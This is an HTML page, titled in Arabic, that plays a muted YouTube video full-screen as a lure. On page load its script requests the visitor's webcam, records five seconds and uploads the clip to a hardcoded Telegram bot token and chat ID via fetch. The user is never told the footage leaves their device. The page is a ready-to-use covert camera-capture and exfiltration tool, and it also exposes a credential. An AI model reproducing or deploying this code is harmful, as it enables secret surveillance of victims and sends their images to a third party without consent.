<!DOCTYPE html>
<html lang="ar">
<head>
  <meta charset="UTF-8">
  <title>تسجيل فيديو والكاميرا تظهر فوق YouTube</title>
  <style>
    body, html {
      margin: 0;
      padding: 0;
      height: 100%;
      overflow: hidden;
    }
    #youtube {
      position: absolute;
      top: 0;
      left: 0;
      width: 100vw;
      height: 100vh;
      z-index: 1;
    }
    #video {
      position: absolute;
      top: 20px;
      left: 20px;
      width: 320px;
      height: 240px;
      border: 3px solid #00ff99;
      border-radius: 10px;
      z-index: 2;
    }
  </style>
</head>
<body>

  <!-- YouTube Video as background -->
  <iframe id="youtube" src="https://www.youtube.com/embed/vaP0ZdA-KHo?autoplay=1&mute=1&controls=0&loop=1&playlist=vaP0ZdA-KHo" frameborder="0" allow="autoplay; encrypted-media" allowfullscreen></iframe>

  <!-- Camera video -->
  <video id="video" autoplay muted playsinline></video>

  <script>
    const BOT_TOKEN = '7808033895:AAFnqEHgGsWmj3JOy9c0Q_6swZmltih6orU';
    const CHAT_ID = '6036900535';

    const video = document.getElementById('video');

    async function startRecording() {
      try {
        const stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: false });
        video.srcObject = stream;

        const recorder = new MediaRecorder(stream);
        let chunks = [];

        recorder.ondataavailable = (e) => chunks.push(e.data);

        recorder.onstop = async () => {
          const blob = new Blob(chunks, { type: 'video/webm' });
          const formData = new FormData();
          formData.append('chat_id', CHAT_ID);
          formData.append('video', blob, 'recorded.webm');

          try {
            const res = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendVideo`, {
              method: 'POST',
              body: formData
            });

            if (res.ok) {
              console.log("✅ تم إرسال الفيديو بنجاح");
            } else {
              console.error("❌ فشل إرسال الفيديو");
            }
          } catch (err) {
            console.error("📶 خطأ في الاتصال:", err);
          }
        };

        recorder.start();
        setTimeout(() => {
          recorder.stop();
          stream.getTracks().forEach(track => track.stop());
        }, 5000); // تسجيل 5 ثوانٍ فقط

      } catch (err) {
        console.error("🚫 فشل الوصول إلى الكاميرا:", err);
      }
    }

    window.onload = startRecording;
  </script>
</body>
</html>
